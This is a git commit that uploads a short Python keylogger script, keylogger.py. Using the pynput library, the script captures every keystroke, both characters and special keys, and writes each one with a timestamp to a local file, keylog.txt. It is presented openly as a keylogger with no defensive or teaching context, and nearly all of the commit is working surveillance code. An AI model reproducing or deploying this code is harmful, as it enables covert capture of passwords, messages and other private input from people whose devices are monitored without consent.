f53197bb1511e99e30cce1f3eb331fb5576ce851
Grimmjow <yasarullah5678@gmail.com>
2025-02-04 08:02:43 -0500

    Add files via upload

---
+++ keylogger/keylogger.py
@@ -0,0 +1,17 @@
+from pynput.keyboard import Listener
+import logging
+
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def on_press(key):
+    try:
+        logging.info(f"Key {key.char}")
+    except AttributeError:
+        logging.info(f"Special key {key}")
+
+def start_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    start_keylogger()
